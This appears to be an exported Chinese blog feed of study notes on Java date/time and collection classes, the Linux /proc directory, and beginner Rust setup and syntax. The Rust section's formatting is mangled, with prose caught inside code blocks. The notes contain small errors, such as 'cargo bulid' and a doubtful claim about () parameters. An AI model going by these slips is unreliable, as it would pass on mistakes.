<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//1. 使用 now() 返回表示当前日期时间的 对象</span><br><span class="line">LocalDateTime ldt = LocalDateTime.now(); //LocalDate.now();//LocalTime.now()</span><br><span class="line">System.out.println(ldt);</span><br><span class="line">//2. 使用 DateTimeFormatter 对象来进行格式化</span><br><span class="line">// 创建 DateTimeFormatter 对象</span><br><span class="line">DateTimeFormatter dateTimeFormatter = DateTimeFormatter.ofPattern(&quot;yyyy-MM-dd HH:mm:ss&quot;);</span><br><span class="line">String format = dateTimeFormatter.format(ldt);</span><br><span class="line">System.out.println(&quot;格式化的日期=&quot; + format);</span><br><span class="line">System.out.println(&quot;年=&quot; + ldt.getYear());</span><br><span class="line">System.out.println(&quot;月=&quot; + ldt.getMonth());</span><br><span class="line">System.out.println(&quot;月=&quot; + ldt.getMonthValue());</span><br><span class="line">System.out.println(&quot;日=&quot; + ldt.getDayOfMonth());</span><br><span class="line">System.out.println(&quot;时=&quot; + ldt.getHour());</span><br><span class="line">System.out.println(&quot;分=&quot; + ldt.getMinute());</span><br><span class="line">System.out.println(&quot;秒=&quot; + ldt.getSecond());</span><br><span class="line">LocalDate now = LocalDate.now(); //可以获取年月日</span><br><span class="line">LocalTime now2 = LocalTime.now();//获取到时分秒</span><br><span class="line">//提供 plus 和 minus 方法可以对当前时间进行加或者减</span><br><span class="line">//看看 890 天后，是什么时候 把 年月日-时分秒</span><br><span class="line">LocalDateTime localDateTime = ldt.plusDays(890);</span><br><span class="line">System.out.println(&quot;890 天后=&quot; + dateTimeFormatter.format(localDateTime));</span><br><span class="line">//看看在 3456 分钟前是什么时候，把 年月日-时分秒输出</span><br><span class="line">LocalDateTime localDateTime2 = ldt.minusMinutes(3456);</span><br><span class="line">System.out.println(&quot;3456 分钟前 日期=&quot; + dateTimeFormatter.format(localDateTime2));</span><br></pre></td></tr></table></figure>
<h5 id="时间戳">时间戳</h5>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//1.通过 静态方法 now() 获取表示当前时间戳的对象</span><br><span class="line">Instant now = Instant.now();</span><br><span class="line">System.out.println(now);</span><br><span class="line">//2. 通过 from 可以把 Instant 转成 Date</span><br><span class="line">Date date = Date.from(now);</span><br><span class="line">//3. 通过 date 的 toInstant() 可以把 date 转成 Instant 对象</span><br><span class="line">Instant instant = date.toInstant()</span><br></pre></td></tr></table></figure>
<h3 id="集合">集合</h3>
<h4 id="迭代器">迭代器</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Collection col = new ArrayList();</span><br><span class="line">col.add(new Book(&quot;三国演义&quot;, &quot;罗贯中&quot;, 10.1));</span><br><span class="line">col.add(new Book(&quot;小李飞刀&quot;, &quot;古龙&quot;, 5.1));</span><br><span class="line">col.add(new Book(&quot;红楼梦&quot;, &quot;曹雪芹&quot;, 34.6));</span><br><span class="line">//System.out.println(&quot;col=&quot; + col);</span><br><span class="line">//现在老师希望能够遍历 col 集合</span><br><span class="line">//1. 先得到 col 对应的 迭代器</span><br><span class="line">Iterator iterator = col.iterator();</span><br><span class="line">//2. 使用 while 循环遍历</span><br><span class="line">// while (iterator.hasNext()) &#123;//判断是否还有数据</span><br><span class="line">// //返回下一个元素，类型是 Object</span><br><span class="line">// Object obj = iterator.next();</span><br><span class="line">// System.out.println(&quot;obj=&quot; + obj);</span><br><span class="line">// &#125;</span><br><span class="line">//老师教大家一个快捷键，快速生成 while =&gt; itit</span><br><span class="line">//显示所有的快捷键的的快捷键 ctrl + j</span><br><span class="line">while (iterator.hasNext()) &#123;</span><br><span class="line">Object obj = iterator.next();</span><br><span class="line">System.out.println(&quot;obj=&quot; + obj);</span><br><span class="line">&#125;</span><br><span class="line">//3. 当退出 while 循环后 , 这时 iterator 迭代器，指向最后的元素</span><br><span class="line">// iterator.next();//NoSuchElementException</span><br><span class="line">//4. 如果希望再次遍历，需要重置我们的迭代器</span><br><span class="line">iterator = col.iterator();</span><br><span class="line">System.out.println(&quot;===第二次遍历===&quot;);</span><br><span class="line">while (iterator.hasNext()) &#123;</span><br><span class="line">Object obj = iterator.next();</span><br><span class="line">System.out.println(&quot;obj=&quot; + obj);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="List接口实现">List接口实现</h4>
<h5 id="Collection接口常用方法">Collection接口常用方法</h5>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. public boolean add(E e);  //添加元素到集合</span><br><span class="line">2. public boolean addAll(Collection&lt;? extends E&gt; c); //存放一个集合</span><br><span class="line">3. public boolean contains(Object o);  //查找集合中的元素</span><br><span class="line">4. public boolean isEmpty();  //判断一个集合是否为空</span><br><span class="line">5. public boolean remove(Object 0);//删除一个集合中的元素</span><br><span class="line">6. public int size();//返回集合的长度</span><br><span class="line"></span><br><span class="line">List接口拓展了Collection接口中的方法</span><br><span class="line">1. public E get(int index); //根据索引取得元素</span><br><span class="line">2. public E set(int index,E element);//替换元素，index为要替换元素下标 element为要替换元素</span><br><span class="line">3. public ListIterator&lt;E&gt; listIterator() List //List自己的迭代器</span><br></pre></td></tr></table></figure>
<h5 id="ArrayList">ArrayList</h5>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ArrayList&lt;Integer&gt; list = new ArrayList&lt;Integer&gt;();</span><br><span class="line">List&lt;String&gt; list = new ArrayList&lt;&gt;();</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">List list = new ArrayList();</span><br><span class="line">for (int i = 0; i &lt; 12; i++) &#123;</span><br><span class="line">list.add(&quot;hello&quot; + i);</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(&quot;list=&quot; + list);</span><br><span class="line">//在 2 号位插入一个元素&quot;韩顺平教育&quot;</span><br><span class="line">list.add(1, &quot;韩顺平教育&quot;);</span><br><span class="line">System.out.println(&quot;list=&quot; + list);</span><br><span class="line">//获得第 5 个元素</span><br><span class="line">System.out.println(&quot;第五个元素=&quot; + list.get(4));</span><br><span class="line">//删除第 6 个元素</span><br><span class="line">list.remove(5);</span><br><span class="line">System.out.println(&quot;list=&quot; + list);</span><br><span class="line">//修改第 7 个元素</span><br><span class="line">list.set(6, &quot;三国演义&quot;);</span><br><span class="line">System.out.println(&quot;list=&quot; + list);</span><br><span class="line">//在使用迭代器遍历集合</span><br><span class="line">Iterator iterator = list.iterator();</span><br><span class="line">while (iterator.hasNext()) &#123;</span><br><span class="line">Object obj = iterator.next();</span><br><span class="line">System.out.println(&quot;obj=&quot; + obj);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Vector vector = new Vector(8);</span><br><span class="line">LinkedList linkedList = new LinkedList();</span><br><span class="line">LinkedList&lt;String&gt; link = new LinkedList&lt;String&gt;();</span><br></pre></td></tr></table></figure>
<p><img src="/img/image-20230721160352586.png" alt="image-20230721160352586" /></p>
<h4 id="set接口">set接口</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//1. 以 Set 接口的实现类 HashSet 来讲解 Set 接口的方法</span><br><span class="line">//2. set 接口的实现类的对象(Set 接口对象), 不能存放重复的元素, 可以添加一个 null</span><br><span class="line">//3. set 接口对象存放数据是无序(即添加的顺序和取出的顺序不一致)</span><br><span class="line">//4. 注意：取出的顺序的顺序虽然不是添加的顺序，但是他的固定. Set set = new HashSet();</span><br><span class="line">set.add(&quot;john&quot;);</span><br><span class="line">set.add(&quot;lucy&quot;);</span><br><span class="line">set.add(&quot;john&quot;);//重复</span><br><span class="line">set.add(&quot;jack&quot;);</span><br><span class="line">set.add(&quot;hsp&quot;);</span><br><span class="line">set.add(&quot;mary&quot;);</span><br><span class="line">set.add(null);//</span><br><span class="line">set.add(null);//再次添加 nul</span><br><span class="line"></span><br><span class="line">LinkedHashSet&lt;Integer&gt; lhs = new LinkedHashSet&lt;&gt;();</span><br><span class="line">		lhs.add(29);</span><br><span class="line">		lhs.add(29);</span><br><span class="line">		lhs.add(30);</span><br><span class="line">		lhs.add(21);</span><br><span class="line">		</span><br><span class="line">		for (Integer integer : lhs) &#123;</span><br><span class="line">			System.out.println(integer);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class SetDemo &#123;</span><br><span class="line">	public static void main(String[] args) &#123;</span><br><span class="line">		TreeSet&lt;Student&gt; ts = new TreeSet&lt;Student&gt;(new Comparator&lt;Student&gt;() &#123;</span><br><span class="line">			@Override</span><br><span class="line">			public int compare(Student s1, Student s2) &#123;</span><br><span class="line">				// 注：总分相同等情况下按照语文成绩排序，其次是数学成绩、英语成绩、年龄、姓名</span><br><span class="line">				double num1 = s1.getTotalScore() - s2.getTotalScore();</span><br><span class="line">				double num2 = (num1 == 0) ? s1.getChineseScore() - s2.getChineseScore() :  num1;</span><br><span class="line">				double num3 = (num2 == 0) ? s1.getMathScore() - s2.getMathScore() : num2;</span><br><span class="line">				double num4 = (num3 == 0) ? s1.getEnglishScore() - s2.getEnglishScore() : num3;</span><br><span class="line">				double num5 = (num4 == 0) ? s1.getAge() - s2.getAge() : num4;</span><br><span class="line">				double num6 = (num5 == 0) ? s1.getName().compareTo(s2.getName()) : num5;</span><br><span class="line">				return (num6 &lt; 0) ? -1 : ( (num6 == 0) ? 0 : 1 );</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;);		</span><br><span class="line">		for (int i = 0; i &lt; 10; i++) &#123;</span><br><span class="line">			String name = (char)(i+97) + &quot;zhangsan&quot;;</span><br><span class="line">			int age = getRandomNum(18, 20);</span><br><span class="line">			double chineseScore = getRandomNum(88, 89);</span><br><span class="line">			double mathScore = getRandomNum(90, 91);</span><br><span class="line">			double englishScore = getRandomNum(95, 96);</span><br><span class="line">			</span><br><span class="line">			Student s = new Student(name, age, chineseScore, mathScore, englishScore);</span><br><span class="line">			ts.add(s);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		for (Student s : ts) &#123;</span><br><span class="line">			System.out.println(s);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	public static int getRandomNum(int start, int end) &#123;</span><br><span class="line">		return (int) (Math.random() * (end - start + 1) + start); </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="Map接口实现">Map接口实现</h4>
<h5 id="HashMap与LinkedHashMap">HashMap与LinkedHashMap</h5>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int size();//获取Map集合大小(即元素数量)</span><br><span class="line">boolean isEmpty();//判断是否为空</span><br><span class="line">boolean containsKey(Object key);//判断是否包含某个键</span><br><span class="line">boolean containsValue(Object value);//判断是否包含某个值</span><br><span class="line">V get(Object key);//获取某个键对应的值</span><br><span class="line">V put(K key, V value);//添加键值对(K，V)</span><br><span class="line">V remove(Object key);//移除某个键对应的键值对</span><br><span class="line">void putAll(Map&lt;? extends K, ? extends V&gt; m);//添加另一个Map集合</span><br><span class="line">void clear();//清空所有键值对</span><br><span class="line">Set&lt;K&gt; keySet();//获取键的集合</span><br><span class="line">Collection&lt;V&gt; values();//获取值的集合</span><br><span class="line">Set&lt;Map.Entry&lt;K, V&gt;&gt; entrySet();//获取键值对实体的集合</span><br><span class="line">interface Entry&lt;K,V&gt;//Map中的内部接口</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HashMap&lt;Student, String&gt; hm = new HashMap&lt;Student, String&gt;();</span><br><span class="line">		hm.put(new Student(&quot;2018050401&quot;, &quot;张三&quot;, 18, 80.0),&quot;2018050401&quot;);</span><br><span class="line">		hm.put(new Student(&quot;2018050402&quot;, &quot;李四&quot;, 18, 80.0),&quot;2018050402&quot;);</span><br><span class="line">		hm.put(new Student(&quot;2018050403&quot;, &quot;李四&quot;, 18, 80.0), &quot;2018050403&quot;);</span><br><span class="line">		hm.put(new Student(&quot;2018050404&quot;, &quot;王五&quot;, 18, 80.0), &quot;2018050404&quot;);</span><br><span class="line">		hm.put(new Student(&quot;2018050404&quot;, &quot;王五&quot;, 18, 80.0), &quot;2018050404&quot;);</span><br><span class="line">		</span><br><span class="line">		// 方式二: 通过键值对对象找键找值</span><br><span class="line">		Set&lt;Entry&lt;Student, String&gt;&gt; keyValues = hm.entrySet();</span><br><span class="line">		for (Entry&lt;Student, String&gt; keyValue : keyValues) &#123;</span><br><span class="line">			Student s = keyValue.getKey();</span><br><span class="line">			String value = keyValue.getValue();</span><br><span class="line">			System.out.println(s.getId() + &quot;|&quot; + s.getName() + &quot;|&quot; + s.getAge() + &quot;|&quot; + s.getScore() + &quot;=&quot; + value);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		</span><br><span class="line">LinkedHashMap&lt;Integer, String&gt; lhm = new LinkedHashMap&lt;Integer, String&gt;();</span><br><span class="line">		lhm.put(01, &quot;张三1&quot;);</span><br><span class="line">		lhm.put(02, &quot;张三2&quot;);</span><br><span class="line">		lhm.put(03, &quot;张三3&quot;);</span><br><span class="line">		lhm.put(04, &quot;张三4&quot;);</span><br><span class="line">		lhm.put(05, &quot;张三5&quot;);</span><br><span class="line">		</span><br><span class="line">		Set&lt;Integer&gt; keys = lhm.keySet();</span><br><span class="line">		for (Integer key : keys) &#123;</span><br><span class="line">			System.out.println(key + &quot;|&quot; + lhm.get(key));</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">	</span><br></pre></td></tr></table></figure>
<h5 id="TreeMap">TreeMap</h5>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class TreeMapTest &#123;</span><br><span class="line">    public static void main(String[] agrs)&#123;</span><br><span class="line">        //创建TreeMap对象：</span><br><span class="line">        TreeMap&lt;String,Integer&gt; treeMap = new TreeMap&lt;String,Integer&gt;();</span><br><span class="line">        System.out.println(&quot;初始化后,TreeMap元素个数为：&quot; + treeMap.size());</span><br><span class="line"></span><br><span class="line">        //新增元素:</span><br><span class="line">        treeMap.put(&quot;hello&quot;,1);</span><br><span class="line">        treeMap.put(&quot;world&quot;,2);</span><br><span class="line">        treeMap.put(&quot;my&quot;,3);</span><br><span class="line">        treeMap.put(&quot;name&quot;,4);</span><br><span class="line">        treeMap.put(&quot;is&quot;,5);</span><br><span class="line">        treeMap.put(&quot;jiaboyan&quot;,6);</span><br><span class="line">        treeMap.put(&quot;i&quot;,6);</span><br><span class="line">        treeMap.put(&quot;am&quot;,6);</span><br><span class="line">        treeMap.put(&quot;a&quot;,6);</span><br><span class="line">        treeMap.put(&quot;developer&quot;,6);</span><br><span class="line">        System.out.println(&quot;添加元素后,TreeMap元素个数为：&quot; + treeMap.size());</span><br><span class="line"></span><br><span class="line">        //遍历元素：</span><br><span class="line">        Set&lt;Map.Entry&lt;String,Integer&gt;&gt; entrySet = treeMap.entrySet();</span><br><span class="line">        for(Map.Entry&lt;String,Integer&gt; entry : entrySet)&#123;</span><br><span class="line">            String key = entry.getKey();</span><br><span class="line">            Integer value = entry.getValue();</span><br><span class="line">            System.out.println(&quot;TreeMap元素的key:&quot;+key+&quot;,value:&quot;+value);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        //获取所有的key：</span><br><span class="line">        Set&lt;String&gt; keySet = treeMap.keySet();</span><br><span class="line">        for(String strKey:keySet)&#123;</span><br><span class="line">            System.out.println(&quot;TreeMap集合中的key:&quot;+strKey);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        //获取所有的value:</span><br><span class="line">        Collection&lt;Integer&gt; valueList = treeMap.values();</span><br><span class="line">        for(Integer intValue:valueList)&#123;</span><br><span class="line">            System.out.println(&quot;TreeMap集合中的value:&quot; + intValue);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        //获取元素：</span><br><span class="line">        Integer getValue = treeMap.get(&quot;jiaboyan&quot;);//获取集合内元素key为&quot;jiaboyan&quot;的值</span><br><span class="line">        String firstKey = treeMap.firstKey();//获取集合内第一个元素</span><br><span class="line">        String lastKey =treeMap.lastKey();//获取集合内最后一个元素</span><br><span class="line">        String lowerKey =treeMap.lowerKey(&quot;jiaboyan&quot;);//获取集合内的key小于&quot;jiaboyan&quot;的key</span><br><span class="line">        String ceilingKey =treeMap.ceilingKey(&quot;jiaboyan&quot;);//获取集合内的key大于等于&quot;jiaboyan&quot;的key</span><br><span class="line">        SortedMap&lt;String,Integer&gt; sortedMap =treeMap.subMap(&quot;a&quot;,&quot;my&quot;);//获取集合的key从&quot;a&quot;到&quot;jiaboyan&quot;的元素</span><br><span class="line"></span><br><span class="line">        //删除元素：</span><br><span class="line">        Integer removeValue = treeMap.remove(&quot;jiaboyan&quot;);//删除集合中key为&quot;jiaboyan&quot;的元素</span><br><span class="line">        treeMap.clear(); //清空集合元素：</span><br><span class="line"></span><br><span class="line">        //判断方法：</span><br><span class="line">        boolean isEmpty = treeMap.isEmpty();//判断集合是否为空</span><br><span class="line">        boolean isContain = treeMap.containsKey(&quot;jiaboyan&quot;);//判断集合的key中是否包含&quot;jiaboyan&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class SortedTest &#123;</span><br><span class="line">    private int age;</span><br><span class="line">    public SortedTest(int age)&#123;</span><br><span class="line">        this.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    public int getAge() &#123;</span><br><span class="line">        return age;</span><br><span class="line">    &#125;</span><br><span class="line">    public void setAge(int age) &#123;</span><br><span class="line">        this.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">public class SortedTestComparator implements Comparator&lt;SortedTest&gt; &#123;</span><br><span class="line">    //自定义比较器：实现compare(T o1,T o2)方法：</span><br><span class="line">    public int compare(SortedTest sortedTest1, SortedTest sortedTest2) &#123;</span><br><span class="line">        int num = sortedTest1.getAge() - sortedTest2.getAge();</span><br><span class="line">        if(num==0)&#123;//为0时候，两者相同：</span><br><span class="line">            return 0;</span><br><span class="line">        &#125;else if(num&gt;0)&#123;//大于0时，后面的参数小：</span><br><span class="line">            return 1;</span><br><span class="line">        &#125;else&#123;//小于0时，前面的参数小：</span><br><span class="line">            return -1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public class TreeMapTest &#123;</span><br><span class="line">    public static void main(String[] agrs)&#123;</span><br><span class="line">        //自定义顺序比较</span><br><span class="line">        customSort();</span><br><span class="line">    &#125;</span><br><span class="line">    //自定义排序顺序:</span><br><span class="line">    public static void customSort()&#123;</span><br><span class="line">        TreeMap&lt;SortedTest,String&gt; treeMap = new TreeMap&lt;SortedTest, String&gt;(new SortedTestComparator());</span><br><span class="line">        treeMap.put(new SortedTest(10),&quot;hello&quot;);</span><br><span class="line">        treeMap.put(new SortedTest(21),&quot;my&quot;);</span><br><span class="line">        treeMap.put(new SortedTest(15),&quot;name&quot;);</span><br><span class="line">        treeMap.put(new SortedTest(2),&quot;is&quot;);</span><br><span class="line">        treeMap.put(new SortedTest(1),&quot;jiaboyan&quot;);</span><br><span class="line">        treeMap.put(new SortedTest(7),&quot;world&quot;);</span><br><span class="line">        System.out.println(treeMap.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/img/image-20230721171409085.png" alt="image-20230721171409085" /></p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>linux根目录学习</title>
    <url>/2023/03/03/17-18-38/</url>
    <content><![CDATA[<h2 id="linux根目录基础（更新中）">linux根目录基础（更新中）</h2>
<span id="more"></span>
<p>/proc</p>
<p>参考连接：<a href="https://xz.aliyun.com/t/10579#toc-2">https://xz.aliyun.com/t/10579#toc-2</a></p>
<p>补充：<code>/proc/consoles</code> 是一个用于显示当前系统上所有可用控制台终端的特殊文件。这个文件可以被用于获取当前系统中所有打开的控制台终端的信息，以及它们的状态和属性。该文件显示了当前正在使用的控制台以及它们的状态、设备名称、设备类型等信息。</p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>rust_learn</title>
    <url>/2023/03/09/11-43-09/</url>
    <content><![CDATA[<h1>rust学习笔记</h1>
<span id="more"></span>
<p>学习网站：</p>
<p>官方文档：<a href="https://kaisery.github.io/trpl-zh-cn/">Rust 程序设计语言 - Rust 程序设计语言 简体中文版 (kaisery.github.io)</a>，不是很推荐新手看，整个开头就直接写函数了，很多基础还要自己查。</p>
<p>rust圣经：<a href="https://course.rs/appendix/keywords.html">关键字 - Rust语言圣经(Rust Course)</a>，推荐，讲得很不错</p>
<h1>第一章：安装，基本命令和配置</h1>
<h2 id="vscode安装">vscode安装</h2>
<p>安装基本工具：</p>
<p><a href="https://www.rust-lang.org/zh-CN/tools/install">安装 Rust - Rust 程序设计语言 (rust-lang.org)</a></p>
<p>选择1即可，按流程安装</p>
<p>ps：如果命令行 cargo 没有办法识别，配置系统的环境变量（不是用户环境变量），在path中添加</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\[username].cargo\bin</span><br></pre></td></tr></table></figure>
<p>插件推荐：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rust-analyzer</span><br><span class="line">Rust Syntax</span><br><span class="line">crates</span><br><span class="line">Rust Test Lens</span><br><span class="line">Better TOML</span><br></pre></td></tr></table></figure>
<h2 id="编译">编译</h2>
<p>单个文件编译</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rustc [filename]</span><br></pre></td></tr></table></figure>
<p>项目建立</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cargo new [projectname]</span><br></pre></td></tr></table></figure>
<p>项目中src中的main.rs作为第一个运行的文件，其中的main函数作为第一个运行的函数</p>
<p>项目编译</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cargo check #速度更快，检查是否可以编译</span><br><span class="line">cargo build #编译</span><br><span class="line">cargo run #编译并且运行</span><br><span class="line">cargo bulid --release #会在target∕release下生成可执行文件，运行速度更快</span><br></pre></td></tr></table></figure>
<h2 id="配置">配置</h2>
<p>项目的根目录下面存在有cargo.toml</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[package]</span><br><span class="line">name = &quot;cargo_one&quot;</span><br><span class="line">version = &quot;0.1.0&quot;</span><br><span class="line">edition = &quot;2021&quot;</span><br><span class="line"></span><br><span class="line"># See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html</span><br><span class="line"></span><br><span class="line">[dependencies]</span><br><span class="line">rand = &quot;0.8.5&quot;</span><br></pre></td></tr></table></figure>
<p>package是基本信息</p>
<p>dependencies是扩展包的信息</p>
<p>一般不含有扩展包，国内需要进行换源</p>
<p>window下路径为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\[username]\.cargo</span><br></pre></td></tr></table></figure>
<p>修改config，如果没有就建立一个，复制以下内容，更改为清华源</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[source.crates-io]</span><br><span class="line">replace-with = &#x27;tuna&#x27;</span><br><span class="line"></span><br><span class="line">[source.tuna]</span><br><span class="line">registry = &quot;https://mirrors.tuna.tsinghua.edu.cn/git/crates.io-index.git&quot;</span><br></pre></td></tr></table></figure>
<h1>第二章 基础学习</h1>
<h2 id="1-变量">1. 变量</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">let a; #不可变变量</span><br><span class="line">let mut a; #可变变量</span><br><span class="line">let _a; #取消未使用变量警告，包括方法等</span><br></pre></td></tr></table></figure>
<h2 id="2-关键字">2.关键字</h2>
<p>不能够作为变量命名的关键字如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如下关键字目前有对应其描述的功能。</span><br><span class="line"></span><br><span class="line">as - 强制类型转换，或use 和 extern crate包和模块引入语句中的重命名</span><br><span class="line">break - 立刻退出循环</span><br><span class="line">const - 定义常量或原生常量指针（constant raw pointer）</span><br><span class="line">continue - 继续进入下一次循环迭代</span><br><span class="line">crate - 链接外部包</span><br><span class="line">dyn - 动态分发特征对象</span><br><span class="line">else - 作为 if 和 if let 控制流结构的 fallback</span><br><span class="line">enum - 定义一个枚举类型</span><br><span class="line">extern - 链接一个外部包,或者一个宏变量(该变量定义在另外一个包中)</span><br><span class="line">false - 布尔值 false</span><br><span class="line">fn - 定义一个函数或 函数指针类型 (function pointer type)</span><br><span class="line">for - 遍历一个迭代器或实现一个 trait 或者指定一个更高级的生命周期</span><br><span class="line">if - 基于条件表达式的结果来执行相应的分支</span><br><span class="line">impl - 为结构体或者特征实现具体功能</span><br><span class="line">in - for 循环语法的一部分</span><br><span class="line">let - 绑定一个变量</span><br><span class="line">loop - 无条件循环</span><br><span class="line">match - 模式匹配</span><br><span class="line">mod - 定义一个模块</span><br><span class="line">move - 使闭包获取其所捕获项的所有权</span><br><span class="line">mut - 在引用、裸指针或模式绑定中使用，表明变量是可变的</span><br><span class="line">pub - 表示结构体字段、impl 块或模块的公共可见性</span><br><span class="line">ref - 通过引用绑定</span><br><span class="line">return - 从函数中返回</span><br><span class="line">Self - 实现特征类型的类型别名</span><br><span class="line">self - 表示方法本身或当前模块</span><br><span class="line">static - 表示全局变量或在整个程序执行期间保持其生命周期</span><br><span class="line">struct - 定义一个结构体</span><br><span class="line">super - 表示当前模块的父模块</span><br><span class="line">trait - 定义一个特征</span><br><span class="line">true - 布尔值 true</span><br><span class="line">type - 定义一个类型别名或关联类型</span><br><span class="line">unsafe - 表示不安全的代码、函数、特征或实现</span><br><span class="line">use - 在当前代码范围内(模块或者花括号对)引入外部的包、模块等</span><br><span class="line">where - 表示一个约束类型的从句</span><br><span class="line">while - 基于一个表达式的结果判断是否继续循环</span><br></pre></td></tr></table></figure>
<p>保留变量：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如下关键字没有任何功能，不过由 Rust 保留以备将来的应用。</span><br><span class="line"></span><br><span class="line">abstract</span><br><span class="line">async</span><br><span class="line">await</span><br><span class="line">become</span><br><span class="line">box</span><br><span class="line">do</span><br><span class="line">final</span><br><span class="line">macro</span><br><span class="line">override</span><br><span class="line">priv</span><br><span class="line">try</span><br><span class="line">typeof</span><br><span class="line">unsized</span><br><span class="line">virtual</span><br><span class="line">yield</span><br></pre></td></tr></table></figure>
<p>但是可以通过前缀标识符来处理</p>
<ul>
<li>
<pre><code>Rust 中常用的标识符前缀：

1. r#：用于在标识符名称中使用保留关键字。例如，r#type 表示名称为 type 的标识符。
2. b：用于表示字节字符串（byte string）字面量，例如，b&quot;hello&quot; 表示字节字符串 hello。
3. r：用于表示 raw 字符串字面量，例如，r#&quot;hello \n world&quot;# 表示一个包含转义字符的 raw 字符串。
4. 0b、0o、0x：用于表示二进制、八进制和十六进制整数字面量，例如，0b101 表示二进制数 101。

除了以上常用的标识符前缀之外，Rust 还支持一些其他的标识符前缀，例如：

- crate：用于表示当前 crate 的根模块，例如，crate::foo 表示当前 crate 中名为 foo 的模块。
- self：用于表示当前模块，例如，self::foo 表示当前模块中名为 foo 的标识符。
- super：用于表示当前模块的父模块，例如，super::foo 表示当前模块的父模块中名为 foo 的标识符。
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">## 3.变量类型以及绑定，解绑定义</span><br><span class="line"></span><br><span class="line">### 整型</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</code></pre>
</li>
</ul>
<p>有符号类型：<br />
i8, i16, i32, i64, i128<br />
无符号类型：<br />
u8, u16, u32, u64, u128</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">i8和u8只有一个字节，以此翻倍，i32有4个字节</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 字符型（char）</span><br><span class="line"></span><br><span class="line">字符中不只是存有utf-8，还有其他的字符集，一个字符大小有4个字节</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 字符串型（&amp;str）</span><br><span class="line"></span><br><span class="line">大小是16个字节</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>use std::mem::size_of_val;<br />
fn main() {<br />
let s:&amp;str = “1”;<br />
println!(“{}”, size_of_val(&amp;s))<br />
}</p>
<h1>res: 16</h1>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 单位类型（）</span><br><span class="line"></span><br><span class="line">在 Rust 中，单位类型（unit type）表示为 `()`，它只有一个值，也就是空值，类似于其他编程语言中的 `void` 类型。</span><br><span class="line"></span><br><span class="line">单位类型 `()` 可以用于表示没有返回值的函数，例如：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>rustCopy codefn print_hello() -&gt; () {<br />
println!(“Hello, world!”);<br />
}</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">这个函数没有返回值，因此返回类型为 `()`。另外，在 Rust 中，函数的返回值类型可以省略，编译器会自动推导出返回值类型为 `()`。</span><br><span class="line"></span><br><span class="line">`()` 也可以作为函数参数类型，用于表示不需要参数的函数，例如：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>rustCopy codefn do_something(_: ()) {<br />
println!(“I’m doing something!”);<br />
}</p>
